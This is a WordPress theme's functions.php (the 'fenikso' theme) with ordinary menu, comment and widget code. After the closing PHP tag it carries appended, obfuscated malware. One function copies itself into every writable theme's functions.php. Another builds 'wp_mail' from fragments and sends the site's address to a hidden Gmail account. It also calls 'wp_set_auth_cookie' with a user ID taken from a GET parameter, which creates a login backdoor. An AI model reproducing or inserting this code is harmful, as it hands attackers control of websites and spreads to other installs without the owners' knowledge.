<?php 

function fenikso_setup() {
	load_theme_textdomain( 'fenikso', get_template_directory() . '/languages' );
	
	// 注册菜单
	register_nav_menu( 'primary', __( 'Primary Menu', 'fenikso' ) );  
	
	// 为文章和评论在 <head> 标签上添加 RSS feed 链接。
	add_theme_support( 'automatic-feed-links' );

	// 主题支持的文章格式形式。
	// add_theme_support( 'post-formats', array( 'aside', 'image', 'link', 'quote', 'status' ) );

	// 主题为特色图像使用自定义图像尺寸，显示在 '标签' 形式的文章上。
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 650, 9999 );  
	}
add_action( 'after_setup_theme', 'fenikso_setup' );

/*
 * 网站的页面标题，来自 Twenty Twelve 1.0
 */

function fenikso_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// 添加网站名称
	$title .= get_bloginfo( 'name' );

	// 为首页添加网站描述
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// 在页面标题中添加页码
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'fenikso' ), max( $paged, $page ) );

	return $title;
}
add_filter( 'wp_title', 'fenikso_wp_title', 10, 2 );

/*
 * 自定义搜索框
 */
 
function fenikso_search_form( $form ) {

    $form = '<form role="search" method="get" id="searchform" action="' . home_url( '/' ) . '" >
    <div class="input-append pull-right" id="search"><label class="hide screen-reader-text" for="s">' . __('Search for:') . '</label>
    <input class="span3" type="text" value="' . get_search_query() . '" name="s" id="s" />
    <input class="btn" type="submit" id="searchsubmit" value="'. esc_attr__('Search') .'" />
    </div>
    </form>';

    return $form;
}
add_filter( 'get_search_form', 'fenikso_search_form' );

/*
 * Bootstrap 导航菜单
 */

class fenikso_Nav_Walker extends Walker_Nav_Menu {

     /*
      * @see Walker_Nav_Menu::start_lvl()
      */
     function start_lvl( &$output, $depth ) {
          $output .= "\n<ul class=\"dropdown-menu\">\n";
     }

     /*
      * @see Walker_Nav_Menu::start_el()
      */
     function start_el( &$output, $item, $depth, $args ) {
          global $wp_query;
         
          $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
          $li_attributes = $class_names = $value = '';
          $classes = empty( $item->classes ) ? array() : (array) $item->classes;
          $classes[] = 'menu-item-' . $item->ID;

          if ( $args->has_children ) {
               $classes[] = ( 1 > $depth) ? 'dropdown': 'dropdown-submenu';
               $li_attributes .= ' data-dropdown="dropdown"';
          }

          $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
          $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

          $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
          $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

          $output .= $indent . '<li' . $id . $value . $class_names . $li_attributes . '>';

          $attributes     =     $item->attr_title     ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
          $attributes     .=     $item->target          ? ' target="' . esc_attr( $item->target     ) .'"' : '';
          $attributes     .=     $item->xfn               ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
          $attributes     .=     $item->url               ? ' href="'   . esc_attr( $item->url        ) .'"' : '';
          $attributes     .=     $args->has_children     ? ' class="dropdown-toggle" data-toggle="dropdown"' : '';

          $item_output     =     $args->before . '<a' . $attributes . '>';
          $item_output     .=     $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
          $item_output     .=     ( $args->has_children AND 1 > $depth ) ? ' <b class="caret"></b>' : '';
          $item_output     .=     '</a>' . $args->after;

          $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
     }

     /*
      * @see Walker::display_element()
      */
     function display_element( $element, &$children_elements, $max_depth, $depth = 0, $args, &$output ) {
          if ( ! $element )
               return;
          $id_field = $this->db_fields['id'];
          //display this element
          if ( is_array( $args[0] ) )
               $args[0]['has_children'] = (bool) ( ! empty( $children_elements[$element->$id_field] ) AND $depth != $max_depth - 1 );
          elseif ( is_object(  $args[0] ) )
               $args[0]->has_children = (bool) ( ! empty( $children_elements[$element->$id_field] ) AND $depth != $max_depth - 1 );

          $cb_args = array_merge( array( &$output, $element, $depth ), $args );
          call_user_func_array( array( &$this, 'start_el' ), $cb_args );

          $id = $element->$id_field;

          // descend only when the depth is right and there are childrens for this element
          if ( ( $max_depth == 0 OR $max_depth > $depth+1 ) AND isset( $children_elements[$id] ) ) {

               foreach ( $children_elements[ $id ] as $child ) {

                    if ( ! isset( $newlevel ) ) {
                         $newlevel = true;
                         //start the child delimiter
                         $cb_args = array_merge( array( &$output, $depth ), $args );
                         call_user_func_array( array( &$this, 'start_lvl' ), $cb_args );
                    }
                    $this->display_element( $child, $children_elements, $max_depth, $depth + 1, $args, $output );
               }
               unset( $children_elements[ $id ] );
          }

          if ( isset( $newlevel ) AND $newlevel ) {
               //end the child delimiter
               $cb_args = array_merge( array( &$output, $depth ), $args );
               call_user_func_array( array( &$this, 'end_lvl' ), $cb_args );
          }

          //end this element
          $cb_args = array_merge( array( &$output, $element, $depth ), $args );
          call_user_func_array( array( &$this, 'end_el' ), $cb_args );
     }
}

/*
 * 给激活的导航菜单添加 .active
 */
function fenikso_nav_menu_css_class( $classes ) {
     if ( in_array('current-menu-item', $classes ) OR in_array( 'current-menu-ancestor', $classes ) )
          $classes[]     =     'active';

     return $classes;
}
add_filter( 'nav_menu_css_class', 'fenikso_nav_menu_css_class' );


/*
 * 显示前进与后退导航链接
 */
if ( ! function_exists( 'fenikso_content_nav' ) ) :

function fenikso_content_nav( $html_id ) {
	global $wp_query;

	$html_id = esc_attr( $html_id );

	if ( $wp_query->max_num_pages > 1 ) : ?>
		<ul id="<?php echo $html_id; ?>" class="pager">
			<li class="previous"><?php next_posts_link( __( '&larr; Older posts', 'fenikso' ) ); ?></li>
			<li class="next"><?php previous_posts_link( __( 'Newer posts &rarr;', 'fenikso' ) ); ?></li>
		</ul>
	<?php endif;
}
endif;

/*
 * 改变头像图片的 Class
 */

function fenikso_avatar_css($class) {
	$class = str_replace("class='avatar", "class='img-circle", $class) ;
return $class;
}
add_filter('get_avatar','fenikso_avatar_css');

/*
 * 小工具
 */

function fenikso_widgets_init() {
  register_sidebar( array(
    'name'          =>  __( 'Sidebar Bottom', 'fenikso' ),
    'id'            =>  'sidebar-bottom',
    'description'   =>  __( 'Sidebar Bottom', 'fenikso' ),
    'before_widget' =>  '<div id="%1$s" class="%2$s"><section>',
    'after_widget'  =>  '</section></div>',
    'before_title'  =>  '<h3><span>',
    'after_title'   =>  '</span></h3>',
  ) );
  register_sidebar( array(
    'name'          =>  __( 'Sidebar Right', 'fenikso' ),
    'id'            =>  'sidebar-right',
    'description'   =>  __( 'Sidebar Right', 'fenikso' ),
    'before_widget' =>  '<div id="%1$s" class="%2$s"><section>',
    'after_widget'  =>  '</section></div>',
    'before_title'  =>  '<div class="title-line"><h3>',
    'after_title'   =>  '</h3></div>',
  ) );
  
}
add_action( 'widgets_init', 'fenikso_widgets_init' );

/*
 * 自定义字段列表的显示 
 */
function fenikso_the_meta() {
   if ( $keys = get_post_custom_keys() ) {
      echo "<dl class='dl-horizontal'>\n";
      foreach ( (array) $keys as $key ) {
              $keyt = trim($key);
                if ( is_protected_meta( $keyt, 'post' ) )
                      continue;
              $values = array_map('trim', get_post_custom_values($key));
              $value = implode($values,', ');
              echo apply_filters('the_meta_key', "<dt>$key</dt><dd>$value</dd>\n", $key, $value);
      }
      echo "</dl>\n";
    }
}

/*
 * 脚本与样式
 */
function fenikso_scripts_styles() {
	global $wp_styles;
  //  需要时加载回复评论的脚本文件
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );
}
add_action( 'wp_enqueue_scripts', 'fenikso_scripts_styles' );

/*
 * 评论列表的显示
 */
if ( ! function_exists( 'fenikso_comment' ) ) :
function fenikso_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	  // 用不同于其它评论的方式显示 trackbacks 。
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:', 'fenikso' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(Edit)', 'fenikso' ), '<span class="edit-link">', '</span>' ); ?>
		</p>
	<?php
		break;
		default :
		// 开始正常的评论
		global $post;
	 ?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>" class="media comment">
			<div class="pull-left">
  			<?php // 显示评论作者头像 
  			  echo get_avatar( $comment, 64 ); 
  			?>
			</div>
			<?php // 未审核的评论显示一行提示文字
			  if ( '0' == $comment->comment_approved ) : ?>
  			<p class="comment-awaiting-moderation">
  			  <?php _e( 'Your comment is awaiting moderation.', 'fenikso' ); ?>
  			</p>
			<?php endif; ?>
			<div class="media-body">
				<h4 class="media-heading">
  				<?php // 显示评论作者名称
  				    printf( '%1$s %2$s',
  						get_comment_author_link(),
  						// 如果当前文章的作者也是这个评论的作者，那么会出现一个标签提示。
  						( $comment->user_id === $post->post_author ) ? '<span class="label label-info"> ' . __( 'Post author', 'fenikso' ) . '</span>' : ''
  					);
  				?>
  		    <small>
    				<?php // 显示评论的发布时间
    				    printf( '<a href="%1$s"><time datetime="%2$s">%3$s</time></a>',
    						esc_url( get_comment_link( $comment->comment_ID ) ),
    						get_comment_time( 'c' ),
    					  // 翻译: 1: 日期, 2: 时间
    						sprintf( __( '%1$s %2$s', 'fenikso' ), get_comment_date(), get_comment_time() )
    					);
    				?>
  				</small>
				</h4>
				<?php // 显示评论内容
				  comment_text(); 
				?>
				<?php // 显示评论的编辑链接 
				  edit_comment_link( __( 'Edit', 'fenikso' ), '<p class="edit-link">', '</p>' ); 
				?>
				<div class="reply">
					<?php // 显示评论的回复链接 
					  comment_reply_link( array_merge( $args, array( 
					    'reply_text' =>  __( 'Reply', 'fenikso' ), 
					    'after'      =>  ' <span>&darr;</span>', 
					    'depth'      =>  $depth, 
					    'max_depth'  =>  $args['max_depth'] ) ) ); 
					?>
				</div>
			</div>
		</article>
	<?php
		break;
	endswitch; // end comment_type check
}
endif;







?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>